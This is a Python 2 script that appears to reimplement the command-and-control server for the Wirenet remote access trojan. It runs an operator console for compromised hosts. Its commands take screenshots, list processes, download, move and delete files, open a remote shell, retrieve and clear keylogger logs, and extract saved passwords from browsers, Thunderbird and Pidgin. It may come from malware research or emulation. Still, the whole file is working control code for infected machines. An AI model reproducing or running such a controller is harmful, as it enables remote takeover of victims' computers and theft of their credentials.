import SocketServer
import struct
from Crypto.Cipher import AES
import logging
import sys
import cmd
import threading
import pprint

mode = AES.MODE_CFB

#logging.getLogger().setLevel(logging.DEBUG)

server = None
cli = None
sockets = []
run = True

class WirenetCli(cmd.Cmd):
    def __init__(self):
        cmd.Cmd.__init__(self)
        self.s = None
        self.prompt = "wirenet $ "

    def emptyline(self):
        return

    def do_ps(self, line):
        if self.s == None:
            print "No session selected"
            return
        self.s.send(36, "")
        self.s.wait()

    def do_screen(self, line):
        if self.s == None:
            print "No session selected"
            return
        self.s.send(49, "\x0F\x0f")
        self.s.wait()

    def do_get(self, line):
        if self.s == None:
            print "No session selected"
            return
        self.s.send(14, line + "\x07")
        self.s.wait()

    def do_rm(self, line):
        if self.s == None:
            print "No session selected"
            return

        self.s.send(23, line)
        #self.s.wait()

    def do_ls(self, line):
        if self.s == None:
            print "No session selected"
            return

        self.s.send(12, line)
        self.s.wait()
    
    def do_mkdir(self, line):
        if self.s == None:
            print "No session selected"
            return

        self.s.send(24, line)
        #self.s.wait()
    
    def do_cp(self, line):
        if self.s == None:
            print "No session selected"
            return

        if len(line.split(' ')) != 2:
            print "cp old new"
            return

        data = line.replace(' ', '\x07')
        self.s.send(20, data + '\x07')
    
    def do_mv(self, line):
        if self.s == None:
            print "No session selected"
            return

        if len(line.split(' ')) != 2:
            print "mv old new"
            return

        data = line.replace(' ', '\x07')
        self.s.send(22, data + '\x07')
        #self.s.wait()
    
    def do_creds(self, line):
        if self.s == None:
            print "No session selected"
            return

        self.s.send(57, '\x00'*4)
        self.s.wait()
    
    def do_cred_thunderbird(self, line):
        if self.s == None:
            print "No session selected"
            return

        self.s.send(61, '')
        self.s.wait()
    
    def do_cred_pidgin(self, line):
        if self.s == None:
            print "No session selected"
            return

        self.s.send(59, '')
        self.s.wait()

    def do_log_get(self, line):
        if self.s == None:
            print "No session selected"
            return

        self.s.send(53, '')
        self.s.wait()
    
    def do_shell(self, line):
        if self.s == None:
            print "No session selected"
            return

        self.s.send(28, '')
        while 1:
            try:
                line = sys.stdin.readline()
                if not line:
                    break
                self.s.send(30, line)
            except AttributeError:
                return
            except KeyboardInterrupt:
                break

        self.s.send(29, '')

        self.s.wait()
    
    def do_log_clear(self, line):
        if self.s == None:
            print "No session selected"
            return

        self.s.send(52, '')

    def do_info(self, line):
        if self.s == None:
            print "No session selected"
            return
        print "arch: %s" % self.s.arch
        print "name: %s" % self.s.name
        print self.s.system


    def do_exit(self, line):
        return True

    def do_session(self, line):
        if line != "":
            try:
                self.s = sockets[int(line)]
                print "Switch to session %s context" % line
                self.prompt = "%s:%s $ " % (self.s.client_address[0], self.s.client_address[1])
            except:
                print "Session %s not exist" % line
            return

        i = 0
        for s in sockets:
            print "%d %s:%s %s %s" % (i, s.client_address[0], s.client_address[1],
                    s.arch, s.name)
            i += 1

        self.s = None
        self.prompt = "wirenet $ "

    def do_EOF(self, line):
        return True


class WirenetTCPHandler(SocketServer.BaseRequestHandler):

    def setup(self):
        self.event = threading.Event()
        logging.info("%s:%s connected", 
            self.client_address[0], self.client_address[1])
        sockets.append(self)

    def finish(self):
        cli.prompt = "wirenet $ "
        cli.s = None
        print "Session %s:%s disconnected" % \
            (self.client_address[0], self.client_address[1])
        logging.info("%s:%s disconnected", 
            self.client_address[0], self.client_address[1])
        sockets.remove(self)

    def wait(self):
        self.event.wait()

    def recv(self):
        data_len = struct.unpack('<I', self.request.recv(0x4))[0]
        data_action = ord(self.request.recv(0x1))
        data = self.request.recv(data_len-1)

        logging.debug("%s:%s received, data_action: 0x%x, data_len %s", 
            self.client_address[0], self.client_address[1],
            data_action, data_len)

        return (data_action, data)

    def send(self, data_action, data):
        self.event.clear()

        data_len = struct.pack("I", 1 + len(data))
        
        logging.debug("%s:%s send, data_action: 0x%x, data_len %s", 
            self.client_address[0], self.client_address[1],
            data_action, data_len)

        self.request.sendall(data_len)
        self.request.sendall(chr(data_action))
        self.request.sendall(data)


    def handle(self):
            while run:
                try:
                    data_action, data = self.recv()
                except struct.error:
                    break
                # pprint.pprint(data)

                if data_action == 0x03:
                    key = data[:0x20]
                    iv = data[0x20:0x20+0x10]
                    testpacket = data[0x20+0x10:0x20+0x10+0x10]

                    aes = AES.new(key, mode, iv,  segment_size=16)
                    logging.debug("%s:%s key: %s",
                        self.client_address[0], self.client_address[1], 
                        key.encode('hex'))
                    logging.debug("%s:%s iv: %s",
                        self.client_address[0], self.client_address[1], 
                        iv.encode('hex'))
                    logging.debug("%s:%s data_dec: %s",
                        self.client_address[0], self.client_address[1],
                        aes.decrypt(data).encode('hex'))
                    
                    self.send(0x05, "RGI28DQ30QB8Q1F7" + "A"*0x30 )

                elif data_action == 0x05:
                    # auth OK with the info
                    data = data[9:].split('\x07')
                    print "\nNew session %s:%s" % \
                        (self.client_address[0], self.client_address[1])
                    self.arch = data[0]
                    self.name = data[1]
                    self.system = data[2].strip('\n')

                elif data_action == 14:
                    # received file
                    data = data[1:]
                    filename = data.split('\x07')[0]
                    file_size = data.split('\x07')[1]
                    if file_size == "18446744073709551615":
                        print "File %s does not exist" % filename
                        continue

                    file_size = int(file_size)
                    filename = filename.replace('/', '_')
                    print "save file as %s size %d" % (filename, file_size)
                    file_len, file_data = self.recv()
                    open(filename, 'w').write(file_data[1:])
                
                elif data_action == 12:
                    # ls result
                    files = data.split('\x07')
                    for i in range (0, len(files)/3):
                        x = i*3
                        print "%s %s %s" % (files[x], files[x+1], files[x+2])
                
                elif data_action == 0x1d:
                    # shell init
                    print "Shell is stop"

                elif data_action == 0x1c:
                    # shell init
                    print "Shell is start with %s (EOF to exit)" % data

                elif data_action == 0x1e:
                    # shell result
                    sys.stdout.write(data)

                elif data_action == 55:
                    # get log send this if no log?
                    pprint.pprint(data)

                elif data_action == 57:
                    # browser creds
                    pprint.pprint(data)
                
                elif data_action == 61:
                    # thunderbird creds
                    pprint.pprint(data)
                
                elif data_action == 59:
                    # pidgin creds
                    pprint.pprint(data)

                elif data_action == 36:
                    # ps list
                    data_str = ''
                    n = 0
                    for c in data:
                        if c == '\x07':
                            if n < 3:
                                c = ' '
                                n += 1
                            else:
                                c = '\n'
                                n = 0
                        data_str += c
                    print data_str.strip('\n')

                self.event.set()

class ThrCliWirenet(threading.Thread):
    def run(self):
        global cli
        cli = WirenetCli()
        cli.cmdloop()

class ThrServWirenet(threading.Thread):
    def run(self):
        global server
        HOST, PORT = "localhost", 4141
        try:
            server = SocketServer.TCPServer((HOST, PORT), WirenetTCPHandler)
            server.serve_forever()
        except IOError as e:
            print e

if __name__ == "__main__":
    thr_cli = ThrCliWirenet()
    thr_serv = ThrServWirenet()
    thr_cli.start()
    thr_serv.start()
    try:
        thr_cli.join()
    except:
        pass

    print "Please wait until the server die.."
    run = False
    if server != None:
        server.shutdown()

